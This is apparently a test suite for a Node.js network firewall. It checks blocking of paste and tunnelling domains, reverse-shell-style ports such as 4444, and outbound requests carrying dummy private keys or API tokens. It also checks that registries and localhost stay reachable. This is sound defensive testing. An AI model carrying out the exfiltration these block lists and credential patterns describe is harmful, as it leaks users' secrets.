/**
 * Comprehensive Network Config Coverage Tests
 * Tests EVERY network config option (blocked/allowed domains, ports, credentials)
 */

const {
  setupTestDir,
  cleanupTestDir,
  writeMinimalConfig,
  runWithFirewall,
  isBlocked,
  TestTracker
} = require('../utils');
const net = require('net');

async function runNetworkCoverageTests() {
  const tracker = new TestTracker('network-coverage');
  
  console.log('\n════════════════════════════════════════════════════════════');
  console.log('[NET-COV] NETWORK CONFIG COVERAGE');
  console.log('════════════════════════════════════════════════════════════\n');
  
  // =========================================================================
  // BLOCKED DOMAINS - Test each one
  // =========================================================================
  console.log('--- Blocked Domains (Every Config Entry) ---\n');
  
  const blockedDomains = [
    'paste.ee',
    'pastebin.com',
    'transfer.sh',
    'temp.sh',
    'ngrok.io',
    'localtunnel.me',
    'hastebin.com',
    'ghostbin.com'
  ];
  
  for (const domain of blockedDomains) {
    await tracker.runTest(`blockedDomains - ${domain}`, async () => {
      const testDir = setupTestDir('net-blocked-' + domain.replace(/\./g, '_'));
      
      try {
        writeMinimalConfig(testDir, {
          network: {
            enabled: true,
            mode: 'block',
            blockedDomains: blockedDomains,
            allowedDomains: []
          }
        });
        
        const code = `
          const http = require('http');
          const req = http.request({
            hostname: '${domain}',
            port: 80,
            path: '/',
            method: 'GET'
          }, (res) => {
            console.log('DOMAIN_BYPASS_SUCCESS');
          });
          req.on('error', (e) => {
            console.log('DOMAIN_BLOCKED:' + e.message);
          });
          req.end();
          setTimeout(() => process.exit(0), 2000);
        `;
        
        const result = await runWithFirewall(testDir, code, { timeout: 5000 });
        
        return {
          pass: isBlocked(result.output) || result.output.includes('DOMAIN_BLOCKED'),
          reason: result.output.includes('DOMAIN_BYPASS_SUCCESS') ? `BYPASS: ${domain} accessible` : 'blocked',
          debug: result.output
        };
      } finally {
        cleanupTestDir(testDir);
      }
    });
  }
  
  // =========================================================================
  // ALLOWED DOMAINS - Test each one (should NOT be blocked)
  // =========================================================================
  console.log('\n--- Allowed Domains (Every Config Entry - Should Allow) ---\n');
  
  const allowedDomains = [
    'registry.npmjs.org',
    'registry.yarnpkg.com',
    'github.com',
    'api.github.com',
    'raw.githubusercontent.com',
    'nodejs.org',
    'cdn.jsdelivr.net',
    'unpkg.com'
  ];
  
  for (const domain of allowedDomains) {
    await tracker.runTest(`allowedDomains - ${domain} (should allow)`, async () => {
      const testDir = setupTestDir('net-allowed-' + domain.replace(/\./g, '_'));
      
      try {
        writeMinimalConfig(testDir, {
          mode: {
            strictMode: true
          },
          network: {
            enabled: true,
            mode: 'block',
            blockedDomains: ['*'],  // Block everything
            allowedDomains: allowedDomains  // Except these
          }
        });
        
        // Simple test - just try to make a request to the allowed domain
        // The firewall should allow it even though blockedDomains includes '*'
        const code = `
          const http = require('http');
          
          const req = http.request({
            hostname: '${domain}',
            port: 80,
            path: '/',
            method: 'GET',
            timeout: 1000
          }, (res) => {
            console.log('ALLOWED_SUCCESS');
            process.exit(0);
          });
          req.on('error', (e) => {
            // Network errors (ECONNREFUSED, ETIMEDOUT, etc.) mean firewall allowed it
            if (e.code === 'ECONNREFUSED' || e.code === 'ETIMEDOUT' || e.code === 'ENOTFOUND' || e.code === 'ENETUNREACH') {
              console.log('ALLOWED_SUCCESS:network_error');
            } else if (e.message && e.message.includes('blocked')) {
              console.log('ALLOWED_BLOCKED:' + e.message);
            } else {
              console.log('ALLOWED_SUCCESS:other_error');
            }
            process.exit(0);
          });
          req.end();
          setTimeout(() => process.exit(0), 2000);
        `;
        
        const result = await runWithFirewall(testDir, code, { timeout: 5000 });
        
        // Test passes if:
        // 1. Got ALLOWED_SUCCESS (connection succeeded or got network error like ECONNREFUSED)
        // 2. NOT blocked by firewall (no NETWORK BLOCKED message)
        const wasAllowed = result.output.includes('ALLOWED_SUCCESS');
        const wasBlockedByFirewall = result.output.includes('NETWORK BLOCKED') || 
                                     result.output.includes('ALLOWED_BLOCKED');
        
        return {
          pass: wasAllowed && !wasBlockedByFirewall,
          reason: wasBlockedByFirewall ? `ERROR: ${domain} blocked by firewall` : 'allowed',
          debug: result.output
        };
      } finally {
        cleanupTestDir(testDir);
      }
    });
  }
  
  // =========================================================================
  // SUSPICIOUS PORTS - Test each one
  // =========================================================================
  console.log('\n--- Suspicious Ports (Every Config Entry) ---\n');
  
  const suspiciousPorts = [4444, 5555, 6666, 7777, 8888, 9999];
  
  for (const port of suspiciousPorts) {
    await tracker.runTest(`suspiciousPorts - ${port}`, async () => {
      const testDir = setupTestDir('net-port-' + port);
      
      try {
        writeMinimalConfig(testDir, {
          network: {
            enabled: true,
            mode: 'block',
            suspiciousPorts: suspiciousPorts,
            allowedDomains: []
          }
        });
        
        const code = `
          const net = require('net');
          const client = net.connect({ host: '127.0.0.1', port: ${port} }, () => {
            console.log('PORT_BYPASS_SUCCESS');
            client.end();
          });
          client.on('error', (e) => {
            console.log('PORT_BLOCKED:' + e.message);
          });
          setTimeout(() => process.exit(0), 2000);
        `;
        
        const result = await runWithFirewall(testDir, code, { timeout: 5000 });
        
        return {
          pass: isBlocked(result.output) || result.output.includes('PORT_BLOCKED'),
          reason: result.output.includes('PORT_BYPASS_SUCCESS') ? `BYPASS: port ${port} accessible` : 'blocked',
          debug: result.output
        };
      } finally {
        cleanupTestDir(testDir);
      }
    });
  }
  
  // =========================================================================
  // CREDENTIAL PATTERNS - Test each one
  // =========================================================================
  console.log('\n--- Credential Patterns (Every Config Entry) ---\n');
  
  const credentialPatterns = [
    { pattern: 'BEGIN.*PRIVATE KEY', test: '-----BEGIN PRIVATE KEY-----\nMIIE...', desc: 'Private key' },
    { pattern: 'aws_access_key_id', test: 'aws_access_key_id=AKIA' + 'IOSFODNN7EXAMPLE', desc: 'AWS access key' },
    { pattern: 'aws_secret_access_key', test: 'aws_secret_access_key=wJalr' + 'XUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY', desc: 'AWS secret key' },
    { pattern: 'GITHUB_TOKEN', test: 'GITHUB_TOKEN=ghp_' + '1234567890abcdefghijklmnopqrstuvwxyz', desc: 'GitHub token' },
    { pattern: 'NPM_TOKEN', test: 'NPM_TOKEN=npm_' + '1234567890abcdefghijklmnopqrstuvwxyz', desc: 'NPM token' },
    { pattern: 'SLACK_TOKEN', test: 'SLACK_TOKEN=xoxb-' + '1234567890-1234567890-abcdefghijklmnopqrstuvwx', desc: 'Slack token' },
    { pattern: 'OPENAI_API_KEY', test: 'OPENAI_API_KEY=sk-' + '1234567890abcdefghijklmnopqrstuvwxyz', desc: 'OpenAI API key' }
  ];
  
  for (const { pattern, test, desc } of credentialPatterns) {
    await tracker.runTest(`credentialPatterns - ${desc}`, async () => {
      const testDir = setupTestDir('net-cred-' + desc.replace(/\s+/g, '_'));
      
      try {
        writeMinimalConfig(testDir, {
          network: {
            enabled: true,
            mode: 'block',
            credentialPatterns: credentialPatterns.map(c => c.pattern),
            allowedDomains: []
          }
        });
        
        const code = `
          const http = require('http');
          const data = '${test.replace(/'/g, "\\'")}';
          
          const req = http.request({
            hostname: 'example.com',
            port: 80,
            path: '/',
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              'Content-Length': data.length
            }
          }, (res) => {
            console.log('CRED_BYPASS_SUCCESS');
          });
          
          req.on('error', (e) => {
            console.log('CRED_BLOCKED:' + e.message);
          });
          
          req.write(data);
          req.end();
          setTimeout(() => process.exit(0), 2000);
        `;
        
        const result = await runWithFirewall(testDir, code, { timeout: 5000 });
        
        return {
          pass: isBlocked(result.output) || result.output.includes('CRED_BLOCKED') || result.output.includes('Firewall'),
          reason: result.output.includes('CRED_BYPASS_SUCCESS') ? `BYPASS: ${desc} not detected` : 'blocked',
          debug: result.output
        };
      } finally {
        cleanupTestDir(testDir);
      }
    });
  }
  
  // =========================================================================
  // NETWORK MODE & FLAGS - Test config options
  // =========================================================================
  console.log('\n--- Network Config Options ---\n');
  
  await tracker.runTest('allowLocalhost - localhost should be allowed', async () => {
    const testDir = setupTestDir('net-localhost-allow');
    
    try {
      writeMinimalConfig(testDir, {
        network: {
          enabled: true,
          mode: 'block',
          allowLocalhost: true,
          blockedDomains: []
        }
      });
      
      const server = net.createServer();
      try {
        await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
        const port = server.address().port;
        
        const code = `
          const net = require('net');
          const client = net.connect({ host: '127.0.0.1', port: ${port} }, () => {
            console.log('LOCALHOST_ALLOWED');
            client.end();
          });
          client.on('error', (e) => {
            console.log('LOCALHOST_BLOCKED:' + e.message);
          });
          setTimeout(() => process.exit(0), 2000);
        `;
        
        const result = await runWithFirewall(testDir, code, { timeout: 5000 });
        
        return {
          pass: result.output.includes('LOCALHOST_ALLOWED'),
          reason: result.output.includes('LOCALHOST_BLOCKED') ? 'ERROR: localhost blocked when allowLocalhost=true' : 'allowed',
          debug: result.output
        };
      } finally {
        server.close();
      }
    } finally {
      cleanupTestDir(testDir);
    }
  });
  
  await tracker.runTest('allowPrivateNetworks - private IP should be allowed', async () => {
    const testDir = setupTestDir('net-private-allow');
    
    try {
      writeMinimalConfig(testDir, {
        network: {
          enabled: true,
          mode: 'block',
          allowPrivateNetworks: true,
          blockedDomains: []
        }
      });
      
      const code = `
        const net = require('net');
        const client = net.connect({ host: '192.168.1.1', port: 80, timeout: 500 }, () => {
          console.log('PRIVATE_ALLOWED');
          client.end();
          process.exit(0);
        });
        client.on('timeout', () => {
          console.log('PRIVATE_ALLOWED:timeout');
          client.destroy();
          process.exit(0);
        });
        client.on('error', (e) => {
          // Network errors mean firewall allowed it
          if (e.code === 'ECONNREFUSED' || e.code === 'ETIMEDOUT' || e.code === 'ENETUNREACH' || e.code === 'EHOSTUNREACH') {
            console.log('PRIVATE_ALLOWED:network_error');
          } else if (e.message && e.message.includes('blocked')) {
            console.log('PRIVATE_BLOCKED:' + e.message);
          } else {
            console.log('PRIVATE_ALLOWED:other_error');
          }
          process.exit(0);
        });
        setTimeout(() => {
          console.log('PRIVATE_ALLOWED:test_timeout');
          process.exit(0);
        }, 1000);
      `;
      
      const result = await runWithFirewall(testDir, code, { timeout: 5000 });
      
      const wasAllowed = result.output.includes('PRIVATE_ALLOWED');
      const wasBlockedByFirewall = result.output.includes('NETWORK BLOCKED') || 
                                   result.output.includes('PRIVATE_BLOCKED');
      
      return {
        pass: wasAllowed && !wasBlockedByFirewall,
        reason: wasBlockedByFirewall ? 'ERROR: private network blocked when allowPrivateNetworks=true' : 'allowed',
        debug: result.output
      };
    } finally {
      cleanupTestDir(testDir);
    }
  });
  
  // =========================================================================
  // NETWORK MODE & FLAGS - Test config options
  // =========================================================================
  console.log('\n--- Network Config Options ---\n');
  
  await tracker.runTest('allowLocalhost - localhost should be allowed', async () => {
  const testDir = setupTestDir('net-localhost-allow');
  
  try {
    writeMinimalConfig(testDir, {
      network: {
        enabled: true,
        mode: 'block',
        allowLocalhost: true,
        blockedDomains: []
      }
    });
    
    const server = net.createServer();
    await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
    const port = server.address().port;
    
    const code = `
      const net = require('net');
      const client = net.connect({ host: '127.0.0.1', port: ${port} }, () => {
        console.log('LOCALHOST_ALLOWED');
        client.end();
      });
      client.on('error', (e) => {
        console.log('LOCALHOST_BLOCKED:' + e.message);
      });
      setTimeout(() => process.exit(0), 2000);
    `;
    
    const result = await runWithFirewall(testDir, code, { timeout: 5000 });
    
    server.close();
    
    return {
      pass: result.output.includes('LOCALHOST_ALLOWED'),
      reason: result.output.includes('LOCALHOST_BLOCKED') ? 'ERROR: localhost blocked when allowLocalhost=true' : 'allowed',
      debug: result.output
    };
  } finally {
    cleanupTestDir(testDir);
  }
});

  return tracker.getSummary();
}

module.exports = { runNetworkCoverageTests };

if (require.main === module) {
  runNetworkCoverageTests().then(summary => {
    console.log('\nNetwork Coverage Summary:');
    console.log(`  Passed: ${summary.passed}`);
    console.log(`  Failed: ${summary.failed}`);
    console.log(`  Skipped: ${summary.skipped}`);
    process.exit(summary.failed > 0 ? 1 : 0);
  });
}
